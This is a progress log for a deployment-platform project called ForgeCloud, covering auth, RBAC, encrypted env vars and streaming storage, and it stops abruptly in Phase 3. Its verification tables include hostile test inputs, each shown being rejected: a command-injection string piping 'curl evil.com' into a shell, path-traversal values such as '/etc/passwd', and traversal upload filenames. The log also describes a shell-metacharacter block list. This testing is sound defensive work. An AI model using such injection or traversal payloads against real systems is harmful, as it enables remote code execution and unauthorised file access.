# ForgeCloud — Progress

Running record of what is actually built and verified, phase by phase (see
[docs/ROADMAP.md](./docs/ROADMAP.md)). Every phase gets: what shipped, the decisions made
along the way, how it was verified, and what's deliberately left for later.

| Phase | Title | Status | Completed |
|---|---|---|---|
| 0 | Foundations | ✅ Done | 2026-09-06 |
| 1 | Auth, orgs & RBAC | ✅ Done | 2026-09-06 |
| 2 | Projects & env vars | ✅ Done | 2026-09-06 |
| 3 | Storage & streams | ✅ Done | 2026-09-06 |
| 4 | Queue & worker skeleton | ✅ Done | 2026-09-06 |
| 5 | Realtime (WebSockets + Pub/Sub) | ✅ Done | 2026-09-07 |
| 6 | Real builds via `child_process` | ✅ Done | 2026-09-07 |
| 7 | Docker deployment via `dockerode` | ✅ Done | 2026-09-07 |
| 8 | Retries, rollback, idempotency, DLQ | ✅ Done | 2026-09-07 |
| 9 | Observability | ✅ Done | 2026-09-07 |
| 10 | Local scaling | ✅ Done | 2026-09-07 |
| 11 | Hardening & failure demos | ⬜ Not started | — |
| 12 | Polish for presentation | ⬜ Not started | — |
| A | *Addendum:* binary search over deployment history | ✅ Done | 2026-09-08 |

---

## Phase 0 — Foundations ✅

**Goal:** the monorepo boots, connects to Postgres + Redis, and returns a health check.
**Completed:** 2026-09-06.

### What shipped

**Workspace / tooling**
- `pnpm-workspace.yaml` (`apps/*`, `packages/*`), root `package.json` with the scripts from
  CLAUDE.md §5 plus `infra:up`/`infra:down`/`infra:logs`.
- `tsconfig.base.json` — strict, `noUncheckedIndexedAccess`, ESM (`NodeNext`),
  `verbatimModuleSyntax`, `composite` so packages can be project-referenced.
- Flat ESLint config (`eslint.config.js`) + Prettier + `.gitignore` + `.env.example` (every var
  documented) + `.env` created from it.
- Docs moved into `docs/` so the paths in CLAUDE.md and README resolve.

**`packages/shared`** (leaf — depends on nothing internal)
- `AppError` + typed constructors (`notFound`, `forbidden`, `conflict`, …) and `isAppError`.
- Enums mirroring the Postgres enums: `ORG_ROLES` (+ `ORG_ROLE_RANK` for RBAC comparisons),
  `DEPLOYMENT_STATUSES` (+ `isTerminalStatus`), `WORKER_STATUSES`, `FILE_KINDS`, `LOG_STREAMS`.
- Zod schemas + inferred types for the health/error API responses.
- `REDIS_KEYS`, `REDIS_CHANNELS`, `QUEUE_NAMES` — every key/channel built in one place.

**`packages/config`**
- Zod-parsed env (`env`) with defaults and coercion; invalid config prints the offending fields
  and exits 1 (nothing can run without it, and the logger itself depends on it).
- `.env` is found by walking up from the app's cwd, so `apps/api` and `apps/worker` share the
  repo-root file.
- `createLogger()` — pino, ISO timestamps, `pino-pretty` in dev, and a redaction list
  (`password`, `token`, `secret`, `authorization`, `cookie`, `value_enc`, …) so CLAUDE.md §8
  "secrets are never logged" is enforced by the logger, not by discipline.

**`infra/docker-compose.yml`**
- Postgres 16 + Redis 7, both with healthchecks and named volumes. Redis runs with
  `--appendonly yes` so queue state survives a compose restart.

**`packages/db`**
- Kysely client over a `pg` Pool: singleton per process, 5s connect timeout (fail fast when
  Postgres is down), pool `error` handler so an idle-client drop can't crash the process,
  `int8` parsed as a JS number for the append-only event ids.
- `pingDb()` and `closeDb()` for `/health` and graceful shutdown.
- Hand-written Kysely `Database` types + `Selectable`/`Insertable`/`Updateable` aliases.
- `scripts/migrate.ts` — wrapper around `node-pg-migrate` that injects the validated
  `DATABASE_URL`, resolves the migrations dir from the package (not the caller's cwd), and runs
  the ESM bin with `--tsx`. `spawn` with an argv array, `shell:false` (CLAUDE.md §8).
- First migration `1757000000000_init-identity.ts`: `pgcrypto` + `citext` extensions,
  `set_updated_at()` trigger function, `org_role` enum, and `users` / `organizations` /
  `org_members` with FKs, indexes and `updated_at` triggers. Reversible `down`.

**`apps/api`** (Fastify 5)
- `buildApp()` assembles the instance: pino logger, Zod type provider
  (`fastify-type-provider-zod`), CORS restricted to `CORS_ORIGIN`, 1 MiB body limit.
- Request id: honours an inbound `x-request-id`, else mints a UUID; echoed on every response
  and attached to every log line and error body.
- `plugins/error-handler.ts` — the single error→response mapping: Zod validation errors → 400
  with field details, response-serialization failures → 500, `AppError` → its own status/code,
  everything else → `INTERNAL_ERROR` 500. Stacks and `cause` are logged, never returned. Custom
  404 handler in the same shape.
- `routes/health.ts` + `services/health-service.ts` — `/health` and `/health/ready` probe
  Postgres and Redis **in parallel with a 3s per-check timeout** and return per-dependency
  `{ ok, latencyMs, error }`; 200 when both answer, 503 otherwise (body is identical, so the
  dashboard can render *why*). `/health/live` is a pure liveness probe that touches nothing.
- `lib/redis.ts` — ioredis command connection, connected explicitly at boot, capped retry
  strategy, `maxRetriesPerRequest: 2` so a dead Redis fails a request in seconds instead of
  hanging it.
- `server.ts` — graceful shutdown on `SIGTERM`/`SIGINT`: stop accepting connections, drain
  in-flight requests via `app.close()`, then close the DB pool and Redis, with a
  `SHUTDOWN_TIMEOUT_MS` hard timer that forces exit. `unhandledRejection` / `uncaughtException`
  are logged fatally and routed through the same path.

**`apps/dashboard`** (Next.js 15, App Router)
- Tailwind v4 + TanStack Query provider (client created lazily, one per session).
- `HealthPanel` polls `/health` every 5s and renders overall state, per-dependency latency or
  error, API version/uptime and last-checked time; shows an explicit "cannot reach the API"
  state instead of an empty page.
- Landing page shows the roadmap phase list with Phase 0 marked done.

### Decisions & assumptions

- **Host ports 5433 (Postgres) / 6380 (Redis).** This machine already has Postgres on 5432 and
  Redis on 6379; shifting the container ports avoids a collision. `.env.example` reflects it.
- **`packages/shared` was built in Phase 0**, ahead of the roadmap, because `db`, `config` and
  `api` all needed `AppError` and the shared enums immediately. It's still the dependency leaf.
- **API on port 4000, dashboard on 3000.** README previously implied the dashboard at 3000; the
  API needed its own port.
- **Kysely types are hand-written** (`packages/db/src/types.ts`) rather than codegen'd, so they
  can be updated in the same commit as the migration without needing a live DB. They must be
  edited alongside every future migration.
- **`updated_at` is maintained by a Postgres trigger**, not by each repository — multiple
  processes write these rows and a trigger can't be forgotten.
- **Redis lives in `apps/api/src/lib/redis.ts` for now.** Per `docs/ARCHITECTURE.md` §2.4 the
  shared connection factory belongs in `@forge/queue`; that package doesn't exist until Phase 4,
  and this moves there then.
- **`/health` returns 503 when a dependency is down** (with the full body) rather than 200 with a
  flag — makes it usable as a real readiness probe and drives the failure demo in Phase 11.
- **Fastify's instance decorator is `apiVersion`**, not `version` (Fastify owns `version`).

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm install` | ✅ 277 packages; `esbuild` build script approved via `pnpm.onlyBuiltDependencies` |
| `docker compose -f infra/docker-compose.yml up -d` | ✅ `forge-postgres` + `forge-redis` both report `healthy` |
| `pnpm --filter @forge/db migrate up` | ✅ migration applied; `\dt` shows `users`, `organizations`, `org_members`, `pgmigrations`; `org_role` type exists |
| `pnpm typecheck` | ✅ clean across all 5 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ packages + api (tsc) + dashboard (`next build`, 4 static routes) |
| `GET /health` (all up) | ✅ `200 {"ok":true,…,"postgres":{"ok":true,"latencyMs":16},"redis":{"ok":true,"latencyMs":3}}` |
| `GET /health/live` | ✅ `200 {"ok":true,"pid":…}` |
| Unknown route | ✅ `404 {"error":{"code":"ROUTE_NOT_FOUND",…},"requestId":"…"}` |
| Redis stopped | ✅ `503`, `redis.error: "connect ECONNREFUSED 127.0.0.1:6380"`, API stays up; recovers to `200` when restarted |
| Postgres stopped | ✅ `503`, `postgres.error: "connect ECONNREFUSED 127.0.0.1:5433"`, API stays up; recovers to `200` |
| `SIGTERM` to the API | ✅ logs `shutting down (SIGTERM)` → `shutdown complete`, exits, port released |
| CORS from `http://localhost:3000` | ✅ preflight `204`, `access-control-allow-origin` + `x-request-id` exposed |
| `pnpm dev` | ✅ package watchers + API (`:4000`) + dashboard (`:3000`) all up, both return `200` |

### Not done / deferred on purpose

- No tests yet (Vitest lands with the first real business logic in Phase 1).
- No `apps/worker`, `packages/queue`, `packages/storage` — Phases 3–4.
- No auth: every route is currently public. Phase 1.
- `git init` was run so `.gitignore` applies; nothing has been committed yet.

### Next up — Phase 1 (Auth, orgs & RBAC)

Register/login with argon2, opaque sessions in Redis, `auth` plugin attaching `user`/`org`/`role`,
`requireRole()`, org + member CRUD, API keys, Redis rate limiting, and the dashboard auth screens.

---

## Phase 1 — Auth, orgs & RBAC ✅

**Goal:** a user can register, log in, create an org, and permissions are enforced.
**Completed:** 2026-09-06.

### What shipped

**`packages/shared`** (`src/auth.ts`, `src/constants.ts`)
- Zod schemas + inferred types for the whole auth surface: `registerSchema`, `loginSchema`,
  `publicUserSchema`, `publicOrgSchema`, `orgMembershipSchema`, `orgMemberSchema`,
  `addMemberSchema`, `updateMemberSchema`, `createApiKeySchema`, `apiKeySchema`,
  `createdApiKeySchema`, `sessionResponseSchema`, `authResponseSchema`.
- `passwordSchema` is length-only (10–200 chars) — length is what resists guessing; argon2
  handles the rest. `emailSchema` trims + lowercases. `slugSchema` + `slugify()` shared by orgs
  and projects.
- `REDIS_KEYS.session(tokenHash)` and `REDIS_KEYS.userSessions(userId)` added;
  `RATE_LIMIT_NAMESPACE` + `rateLimitIdentity()` so the rate limiter's own per-route buckets
  also land under `rl:`.
- `API_KEY_PREFIX` (`fc_live_`) and `API_KEY_LOOKUP_LENGTH` so the API key format is defined once.

**`packages/config`**
- New env vars: `SESSION_TTL_SECONDS` (7d), `SESSION_COOKIE_NAME`, `SESSION_COOKIE_SECURE`,
  `ENCRYPTION_KEY`, `STORAGE_ROOT`, `MAX_UPLOAD_BYTES`. All documented in `.env.example`.
- `ENCRYPTION_KEY` is validated as **exactly 32 base64 bytes at boot** — a typo'd key fails
  startup rather than the first secret write.
- `STORAGE_ROOT` is resolved against the **repo root** (the dir holding `.env`), not the
  process cwd, so the API and the future worker agree on one object store.

**`packages/db`**
- Migration `1757100000000_auth-api-keys.ts` → `api_keys` (org-scoped, `prefix` UNIQUE +
  indexed, `key_hash`, `role`, `scopes`, `last_used_at`, `revoked_at`). Reversible.
- `ApiKeysTable` + `ApiKeyRow`/`NewApiKey`/`ApiKeyUpdate` added to the hand-written Kysely types.

**`apps/api`**
- `lib/crypto.ts` — argon2id (OWASP baseline: 19 MiB, t=2, p=1) for passwords; sha256 for
  session tokens and API keys; `generateToken()` (32 random bytes, base64url); `safeEqual()`
  (constant-time); `fakeVerifyPassword()` to equalise login timing for unknown emails.
- `lib/session-cookie.ts` — the one place that knows the cookie shape (`httpOnly`,
  `sameSite: lax`, `secure` in prod).
- `repositories/` — `user-repository`, `org-repository`, `api-key-repository`. `insertOrgWithOwner`
  creates the org + its first `owner` membership **in one transaction** (an ownerless org would be
  unreachable). `countOwners()` backs the last-owner guard.
- `services/session-service.ts` — opaque sessions in Redis, keyed by `sha256(token)` so a Redis
  keyspace dump can't be replayed. Per-user session index set enables `destroyAllSessions()`.
  **Sliding expiry** refreshes the TTL only past the half-life, so an active browser doesn't
  write to Redis on every request.
- `services/auth-service.ts` — register (auto-creates an owned org so the dashboard is never
  empty), login, `changePassword` (which revokes **every** session for that user).
  Postgres unique-violation `23505` is mapped to a clean 409 for the concurrent-register race.
- `services/org-service.ts` — org CRUD, members add/re-role/remove, with the guards:
  `assertCanGrant` (nobody grants above their own rank), owners only managed by owners, and
  `LAST_OWNER` protection.
- `services/api-key-service.ts` — create (returns plaintext **once**), list, revoke (tombstone,
  not delete), and `authenticateApiKey()` (prefix lookup → constant-time hash compare →
  revocation check).
- `plugins/auth.ts` — an `onRequest` hook that resolves either credential kind into one `Actor`
  shape, and never rejects (public routes stay public). Decorators: `requireAuth`, `requireOrg`,
  `requireRole(role)`, `getActor`, `getOrg`. `:orgId` accepts a **uuid or a slug**.
- `plugins/rate-limit.ts` — `@fastify/rate-limit` with the **Redis store** (counters shared
  across replicas, not per-process). Keyed by api-key → user → IP. `skipOnError: true` so a dead
  Redis degrades open rather than locking everyone out; the 429 is thrown as an `AppError` so it
  gets the same body shape as every other error.
- `routes/auth.ts` — `POST /auth/register|login|logout|change-password`, `GET /auth/me`.
- `routes/orgs.ts` — `GET/POST /orgs`, `GET/PATCH /orgs/:orgId`, members CRUD.
- `routes/api-keys.ts` — list/create/revoke under `/orgs/:orgId/api-keys`.

**`apps/dashboard`**
- `lib/api.ts` — `ApiError` carrying the server's own `code`/`message` (so RBAC denials render as
  real sentences), `credentials: 'include'` on every call, plus `hasRole()`/`ROLE_RANK` mirroring
  the server check so the UI hides what the API would refuse.
- `components/session-provider.tsx` — `/auth/me` once, shared; a 401 resolves to `null` rather
  than throwing. `useOrgRole(slug)`.
- `components/ui/primitives.tsx` — `Panel`/`Button`/`Field`/`Input`/`Select`/`ErrorNote`/
  `RoleBadge`/`Empty`.
- `components/auth-form.tsx` + `/login`, `/register`.
- `components/app-shell.tsx` — top bar with **org switcher** (incl. inline create), section nav,
  role badge, sign out. `components/require-session.tsx` gates org routes.
- `/orgs/[orgSlug]/members` — add by email, inline role dropdown, remove; owners shown as a
  badge (not editable), and a viewer sees an explanation instead of the controls.
- `/orgs/[orgSlug]/api-keys` — create, one-time plaintext reveal panel, revoke; the whole page
  is admin-gated with a stated reason.

### Decisions & assumptions

- **`api_keys` has a `role` column** (not in `docs/DATA_MODEL.md`). The data model only had
  `scopes`. A role makes RBAC a single comparison regardless of whether the caller is a human or
  a key. `scopes` is kept as specified but is **unused** in Phase 1. The table was created fresh,
  so this needed no data migration.
- **API keys are sha256, not argon2.** They're 256 bits of CSPRNG — nothing to guess — and auth
  runs on every request, so argon2 per request would be self-inflicted DoS. Passwords stay argon2id.
- **Redis session keys are `session:sha256(token)`.** The raw token exists only in the client
  cookie.
- **A non-member gets 404, not 403**, on `/orgs/:orgId/*` — 403 would confirm the org exists.
- **"Invite" means "add an existing user by email."** There's no mail delivery in this project;
  adding an unregistered email returns `USER_NOT_FOUND`.
- **`owner` is not grantable through the members API** (`addMemberSchema`/`updateMemberSchema`
  exclude it). Ownership transfer is deliberately a separate operation that doesn't exist yet.
- **API keys cannot create orgs or other API keys** — either would let a leaked key widen its own
  blast radius.
- **Registering creates an org** (`"<name>'s org"` unless `orgName` is given) so there is always
  an RBAC scope for projects to hang off.
- **`changePassword` revokes all sessions.** A password change that leaves a stolen cookie valid
  isn't a password change.
- **Rate limits:** global 300/min; `/auth/*` credential routes 10/min; API-key creation 20/min;
  source upload 30/min.
- **`@fastify/rate-limit` and `@fastify/cookie` are used rather than hand-rolled** — neither is a
  §4 learning goal, and both are first-party Fastify.
- **Session-service `destroyAllSessions` prunes the index set**, so a stale member is harmless.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 5 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ packages + api (tsc) + dashboard (`next build`, 8 routes) |
| `migrate up` | ✅ `api_keys` created with the prefix unique constraint + org index |
| `migrate down` ×2 then `up` | ✅ both new migrations roll back and re-apply cleanly |
| Register | ✅ `201`, `Set-Cookie: forge_session=…; HttpOnly; SameSite=Lax; Max-Age=604800`, org auto-created with role `owner` |
| Duplicate register | ✅ `409 EMAIL_TAKEN` |
| Password < 10 chars | ✅ `400 VALIDATION_ERROR` with the field path |
| Wrong password / unknown email | ✅ both `401` with the **identical** message `Invalid email or password` |
| `GET /auth/me` with cookie | ✅ `200` user + orgs + `via: "session"` |
| `GET /auth/me` with no credential | ✅ `401 UNAUTHORIZED` |
| Outsider reads someone else's org | ✅ `404 ORG_NOT_FOUND` (not 403) — same for its members list |
| Viewer creates a project | ✅ `403 FORBIDDEN` "requires the \"member\" role; you are a \"viewer\"" |
| Viewer renames org / adds member | ✅ `403` both |
| Viewer writes/deletes env var, deletes project | ✅ `403` all three |
| Viewer **reads** org + env list | ✅ `200`, secrets still masked |
| Grant `owner` via members API | ✅ `400 VALIDATION_ERROR` (excluded at the schema) |
| Sole owner demotes self | ✅ `409 LAST_OWNER` |
| Admin removes an owner | ✅ `403` "Only an owner can remove another owner" |
| API key create | ✅ `201`, plaintext `fc_live_…` returned once |
| API key list | ✅ prefix + metadata only; **no `key` field** in the response |
| Auth via `Authorization: Bearer fc_live_…` | ✅ `200`, `via: "api_key"`, scoped to its one org |
| Key creates an org | ✅ `403` |
| Key mints another key | ✅ `403` |
| `member`-role key creates a project | ✅ `201` |
| Tampered key (last char changed) | ✅ `401` |
| Revoked key reused | ✅ `401` |
| Login rate limit | ✅ attempts 1–10 → `401`, 11–13 → `429 RATE_LIMITED`; counters visible as `rl:POST/auth/login-ip:127.0.0.1` in Redis |
| Session keys in Redis | ✅ `session:<64-hex>` with TTL ≈604800; `user:<id>:sessions` index present |
| 3 sessions → change password | ✅ `204`, index count 5→0, all three cookies then `401`, old password `401`, new password `200` |
| Single logout | ✅ `204`, that cookie `401`, others unaffected |
| **Browser (headless Chrome)** register → org → project → env → members → API key → revoke → sign out | ✅ 15/15 checks (see Phase 2 table for the shared run) |

### Not done / deferred on purpose

- **No tests committed.** Verification was done with curl + a headless-Chrome script in the
  scratchpad, not with Vitest. Committing real Vitest suites is still outstanding and is the
  biggest gap in these two phases.
- No email delivery, so **no email verification and no password reset** (`users.email_verified_at`
  exists but is never set) and no pending-invite flow.
- **`api_keys.scopes` is stored but never enforced.**
- **No `audit_logs` table or writes** — it's in `DATA_MODEL.md` but not in the Phase 1 checklist;
  mutations currently log via `pino` only.
- **No ownership transfer** endpoint.
- `assertCanGrant` is defence-in-depth only: with `owner` excluded at the schema, `admin` is the
  highest grantable role, so the check can't currently fire through a route.
- No CSRF token. Not needed yet: the session cookie is `SameSite=Lax` and every mutation is a
  non-simple cross-origin request gated by CORS.

### Next up — Phase 2

Projects and env vars on top of this RBAC (shipped in the same session — see below).

---

## Phase 2 — Projects & env vars ✅

**Goal:** manage the thing we'll deploy.
**Completed:** 2026-09-06.

### What shipped

**`packages/shared`** (`src/projects.ts`)
- `projectSchema`, `createProjectSchema`, `updateProjectSchema`, `envVarSchema`,
  `upsertEnvVarSchema`, `bulkEnvVarsSchema`, `storedFileSchema`, `sourceTypeSchema`.
- **`commandSchema` rejects shell metacharacters** (`; & | ` $ > < \` and newlines). Commands run
  through `spawn(..., {shell:false})` so they could never reach a shell anyway — but failing at
  write time is far clearer than failing mid-build, and it's the §8 rule made visible.
- **`relativeDirSchema`** rejects absolute paths and any `..` segment.
- `envVarKeySchema` enforces POSIX-ish names; `healthPathSchema` requires a leading `/`.
- `envVarSchema.value` is **nullable** and `valueLength` is always present — that's the contract
  that lets the UI render `•••• (22)` without ever seeing a secret.

**`packages/db`**
- Migration `1757200000000_projects-env-files.ts` → `file_kind` enum + `projects`,
  `project_env_vars`, `files`; unique `(org_id, slug)` and `(project_id, key)`; check constraints
  on `source_type` and `app_port`; `updated_at` triggers. Reversible.
- Kysely types for all three tables. `project_env_vars.value_enc` is typed `Buffer`.

**`apps/api`**
- `lib/secret-box.ts` — AES-256-GCM with a versioned wire format
  (`version || 12-byte iv || 16-byte tag || ciphertext`) in one `bytea`. Fresh random iv per
  write; the version byte exists so a future key rotation can still read old rows.
- `lib/storage-path.ts` — the **only** place the API joins filesystem paths. Per-segment
  rejection of `..`/separators/NUL, lexical containment check against `STORAGE_ROOT`, plus
  `assertInsideStorageRoot()` which resolves symlinks for read paths.
- `services/project-service.ts` — CRUD with per-org slug uniqueness (auto `-2`, `-3` suffixes),
  `requireProject(orgId, projectId)` as the single lookup so the org filter can't be forgotten,
  and an **explicit camelCase → snake_case patch map** so an unexpected body key can't reach the
  `UPDATE`.
- `services/env-var-service.ts` — everything encrypted at rest regardless of `is_secret`;
  `is_secret` governs **disclosure** only. `resolveEnvForBuild()` and `revealEnvVar()` return
  plaintext and are deliberately **not wired to any HTTP route** — they're for the Phase 6 worker.
- `services/upload-service.ts` — streamed intake via `stream/promises.pipeline` (real
  backpressure, teardown on failure). A `HashingCounter` `Transform` computes sha256 **and**
  enforces `MAX_UPLOAD_BYTES` in the same single pass, aborting mid-stream rather than writing
  the rest. Partial files are unlinked in the failure path; the truncation check runs **before**
  the `files` row is inserted.
- `repositories/project-repository.ts`, `repositories/env-var-repository.ts` — every read filters
  by `org_id`/`project_id`; bulk env upsert runs in one transaction.
- `services/serializers.ts` — central row → response mapping. `password_hash`, `key_hash` and
  `value_enc` have **no mapping at all**, so a new column can't leak by accident.
- `routes/projects.ts` — projects CRUD, env var set/bulk-set/delete/list, and
  `POST|GET /orgs/:orgId/projects/:projectId/source`.
- `app.ts` — registers `@fastify/cookie` (before auth, which reads `request.cookies`),
  `@fastify/multipart` (`fileSize: MAX_UPLOAD_BYTES + 64 KiB`, `files: 1`), rate limit, auth,
  and all routes. API version bumped to `0.2.0`.

**`apps/dashboard`**
- `/orgs/[orgSlug]` — project list + inline create; a viewer sees "Requires the 'member' role".
- `/orgs/[orgSlug]/projects/[projectId]` — settings form (name, root dir, three commands, port,
  health path/timeout), all inputs disabled for a viewer.
- `components/env-vars-panel.tsx` — set one var with a secret toggle, **paste a `.env` block**
  (parsed client-side, comments/quotes handled, everything imported as secret), delete. Secrets
  render as bullets + a character count.
- `components/source-upload-panel.tsx` — file picker with a **real upload progress bar** (XHR,
  because `fetch` still can't report upload progress), then a list of stored archives with size,
  sha256 prefix and timestamp.

### Decisions & assumptions

- **`projects.slug` and `source_type` are create-only** (omitted from `updateProjectSchema`).
  Changing a slug after source is stored under `<org>/<project>/…` would orphan it.
- **Two forward references left unconstrained** until `deployments` exists (Phase 4):
  `projects.active_deployment_id` and `files.deployment_id` are plain `uuid` columns; their FKs
  are added in the deployments migration. `files.deployment_id` is indexed already.
- **`files.original_name` added** (not in `DATA_MODEL.md`) to display the uploaded filename.
  It is **never** used to build a path — the stored object is always `<uuid><ext>`.
- **`project_env_vars.value_length` added** so the UI can show a masked length without
  decrypting. It's plaintext length, which is not sensitive.
- **Non-secret env values are still encrypted** at rest — one code path, no branch to forget.
- **Allowed upload extensions:** `.zip`, `.tar`, `.gz`, `.tgz`; a missing extension is treated as
  `.zip`. Archives are **not** unpacked yet — extraction lands with the Phase 6 `cloning` stage
  (and zip-slip defence belongs there).
- **Storage layout:** `<STORAGE_ROOT>/<orgId>/<projectId>/sources/<uuid><ext>` — every segment is
  a uuid or a fixed literal, so no user input reaches a path. Multiple uploads accumulate;
  the newest source row is what a deployment will use.
- **Upload uses `@fastify/multipart`'s streaming `request.file()`**, not its buffering mode.
- **RBAC on projects:** read = any member, write (project + env vars + upload) = `member`,
  delete project = `admin`. Setting config is normal work; a viewer must not change what runs.
- **Deleting a project leaves its bytes on disk.** The DB rows cascade, but a storage sweep
  belongs with the rest of the storage lifecycle in Phase 3, and orphaned bytes are safer than a
  delete racing a running build.
- **`packages/storage` was not created.** Phase 3 owns it; the API is the only writer for now and
  `lib/storage-path.ts` + `upload-service.ts` are written to be lifted into it.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm typecheck` / `pnpm lint` / `pnpm build` | ✅ all clean |
| `migrate up` | ✅ `projects`, `project_env_vars`, `files` + `file_kind` created; `migrate down` ×2 → `up` round-trips |
| Create project with commands/port/health | ✅ `201`, all fields persisted as sent |
| Duplicate name | ✅ slug auto-suffixed to `sample-app-2` |
| Explicit duplicate slug | ✅ `409 PROJECT_SLUG_TAKEN` |
| **Command injection** `"npm run build; curl evil.com \| sh"` | ✅ `400 VALIDATION_ERROR` — "Commands run without a shell; …" |
| **Path traversal** `rootDir: "../../etc"` | ✅ `400` "Path traversal is not allowed" |
| **Absolute** `rootDir: "/etc/passwd"` | ✅ `400` "Must be a relative path inside the project" |
| PATCH project | ✅ `200`, only the sent fields changed |
| Cross-tenant probe of another org's project uuid | ✅ `404 PROJECT_NOT_FOUND` |
| Set secret env var | ✅ `201`-equivalent `200`, response has `value: null`, `valueLength: 22` |
| Set non-secret env var | ✅ `value: "production"` returned |
| Bulk set | ✅ both stored; secrets masked, non-secrets in clear |
| **Secret plaintext in any API response** | ✅ `grep` over the full env list → **0 occurrences** |
| **Ciphertext in Postgres** | ✅ `value_enc` is opaque hex; `select count(*) … position('super-secret' in encode(value_enc,'escape'))>0` → **0 rows** |
| Invalid env key `9BAD-KEY` | ✅ `400 VALIDATION_ERROR` |
| Duplicate key inside one bulk request | ✅ `400 DUPLICATE_ENV_KEY` |
| Delete env var | ✅ `204`, gone from the list |
| Upload a real 553-byte zip | ✅ `201`; `storagePath` = `<orgId>/<projectId>/sources/<uuid>.zip` |
| **Checksum** vs `sha256sum` on the source file | ✅ byte-identical: `3f762ea8504320246f75996a2f00430148e4b26d93f4be629dbd404cd07b121a` |
| Bytes on disk | ✅ 553 B present under `STORAGE_ROOT`, nowhere else |
| **Traversal filename via curl** `filename=../../../../tmp/pwned.zip` | ✅ `201` with a uuid path; `/tmp/pwned.zip` does not exist |
| **Traversal filename via hand-built raw multipart** `../../../../../../tmp/pwned-raw.zip` | ✅ `201` with a uuid path; nothing written outside the root (verified with `find /tmp -name "pwned*"` → empty) |
| Disallowed extension `.exe` | ✅ `400 UNSUPPORTED_FILE_TYPE` |
| Empty file | ✅ `400 EMPTY_UPLOAD` |
| **51 MiB upload vs the 50 MiB cap** | ✅ `400 UPLOAD_TOO_LARGE`, **no partial file left on disk**, **no `files` row** with `size_bytes > 52428800` |
| Viewer uploads source | ✅ `403` |
| **Browser E2E (headless Chrome)** register → create project → PATCH settings → set secret → paste `.env` → upload archive | ✅ secret never in the DOM, non-secret shown in clear, bulk import stored as secrets, checksum + filename displayed |
| **Browser RBAC** viewer on projects/members/api-keys | ✅ no create button, restriction explained on all three pages |
| Final run on a freshly migrated schema | ✅ register → project → secret env → upload all `200`/`201`; secret leak count `0` |

### Bug found and fixed during verification

- **`@fastify/cors` v11 defaults to `methods: 'GET,HEAD,POST'`.** Every `PATCH`/`PUT`/`DELETE`
  from the dashboard was failing its CORS preflight in a real browser (project settings save, env
  var set/delete, member re-role/remove, API key revoke, project delete) — invisible to curl,
  which doesn't preflight. `app.ts` now sets `methods` and `allowedHeaders` explicitly. Confirmed
  by re-running the preflight for all four verbs and then the browser E2E.
- **Tailwind width conflict** on the members role dropdown: the `Select` base class carries
  `w-full`, so a `w-32` prop is the same specificity and lost, making the row wrap. Width now
  lives on a wrapper `div`.

### Not done / deferred on purpose

- **No Vitest suites** (see Phase 1). All verification was manual/scripted.
- **Archives are never unpacked or validated as archives** — only the extension is checked. Zip
  bombs and zip-slip are Phase 6 concerns, at extraction time.
- **No download/read endpoint** for stored files; `assertInsideStorageRoot()` exists for it but
  is currently unused. Phase 3.
- **Git source intake** (`source_type: 'git'`, `repo_url`) is accepted and stored but nothing
  clones it. Explicitly a later phase.
- **No storage garbage collection**, no per-org quota, no `usage` metering.
- **No `domains` table** — Phase 12 stretch.
- Superseded source uploads are never pruned.
- `ENCRYPTION_KEY` rotation is designed for (version byte) but there's no re-encrypt command.

### Next up — Phase 3 (Storage & streams)

Extract `packages/storage` from `apps/api/src/lib/storage-path.ts` +
`services/upload-service.ts` behind a streamed `put/get/list/delete` interface, add gzip artifact
compression via `node:zlib` in a **worker thread** plus sha256 checksums, and add the streaming
download endpoint (which is where `assertInsideStorageRoot()` finally gets used). The `files`
table, the storage layout and the path-sandbox helper are already in place; Phase 3 is mostly
moving them behind an interface and adding the read path. Worth doing first: the Vitest suites
both phases deferred, since services are already pure enough to unit-test with fake repositories.

---

## Phase 3 — Storage & streams ✅

**Goal:** real streaming IO for uploads/downloads/artifacts.
**Completed:** 2026-09-06.

### What shipped

**`packages/storage`** (new package, `@forge/storage` — depends on `@forge/shared` only)
- `src/keys.ts` — object keys are S3-shaped opaque strings (`<orgId>/<projectId>/sources/<uuid>.zip`).
  One validator (`assertValidKey`) rejects empty/oversized keys, leading/trailing `/`, backslashes,
  NUL, untrimmed segments and **any dot-prefixed segment** (which covers `.`/`..`). Layout builders
  (`sourceKey`, `artifactKey`, `logKey`, `projectPrefix`, `orgPrefix`) live here, so the API and the
  worker can't disagree about where a project's objects are.
- `src/local-object-store.ts` — `LocalObjectStore` implementing `put/get/head/list/delete/deletePrefix`.
  Every operation is a `pipeline()` chain (no buffering, real backpressure). Writes are staged in a
  dot-prefixed temp file next to the target and `rename()`d in only after the whole stream is
  accepted, so a rejected, oversized or interrupted write leaves **no object**. Reads go through
  `resolveExistingKey()`, which `realpath()`s the target and re-checks containment — the only way to
  catch a symlink planted inside the root. `list()` walks recursively and reports regular files only,
  skipping symlinks and staged temps.
- `src/hashing.ts` — `HashingCounter`, a `Transform` that computes sha256 **and** enforces a byte cap
  in the same pass over data we were already streaming (lifted out of the Phase 2 upload service).
- `src/compress-worker.ts` — the `worker_threads` body: `read → sha256 → gzip → sha256 → write`,
  streamed inside the thread, so memory stays flat and both checksums come free. Also `gunzip` and a
  standalone `checksum` op. Handles no keys and no DB — just absolute paths handed to it.
- `src/compress-pool.ts` — a fixed-size pool (default `min(2, cpus-1)`), **lazily spawned** (a process
  that never compresses never pays for a thread), FIFO queue, per-task ids, worker death fails only
  that task and drops the slot, and `closeCompressionPool()` waits for in-flight work before
  terminating. `compressionPoolStats()` exposes threads/busy/queued.
- `src/compress.ts` — `gzipObject` / `gunzipObject` / `checksumObject`: the main thread does key
  validation, symlink-resolved read paths and the staged write + commit; the thread does the CPU.
- `src/compress-protocol.ts` — the message contract, shared by both sides, with `ResultFor<T>` so
  callers need no casts.

**`packages/db`**
- Migration `1757300000000_file-compression.ts` — four nullable columns on `files`:
  `parent_file_id` (→ `files(id) ON DELETE SET NULL`), `compression`, `uncompressed_bytes`,
  `uncompressed_checksum`; a check constraint limiting `compression` to `'gzip'`, a second one
  keeping the metadata coherent (compressed ⇒ both sides described), and an index on
  `parent_file_id`. Reversible; no data migration needed.
- Kysely types updated; `docs/DATA_MODEL.md`'s `files` table updated to match.

**`packages/shared`**
